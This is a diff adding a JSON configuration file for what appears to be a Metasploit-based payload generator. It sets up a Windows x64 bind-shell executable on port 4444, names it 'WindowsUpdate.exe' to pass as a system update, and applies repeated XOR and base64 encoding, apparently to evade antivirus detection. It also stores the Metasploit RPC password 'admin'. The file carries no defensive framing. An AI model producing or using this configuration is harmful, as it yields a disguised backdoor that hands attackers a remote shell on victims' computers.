@@ -1,0 +1,18 @@
+{
+	"metasploit_password": "admin",
+	"metasploit_server_port": "55553",
+	"metasploit_server_host": "127.0.0.1",
+	"Host": "127.0.0.1",
+	"Port": "4444",
+	"Target_IP": "127.0.0.1",
+	"Payload": "windows/x64/shell_bind_tcp",
+	"Output": "WindowsUpdate.exe",
+	"Output_Directory": "~/Desktop/",
+	"Format": "exe",
+	"Platform": "windows",
+	"Arch": "x64",
+	"Encoder": "x64/xor_dynamic",
+	"Encryption": "base64",
+	"Iteration": "10",
+	"EXITFUNC": "process"
+}
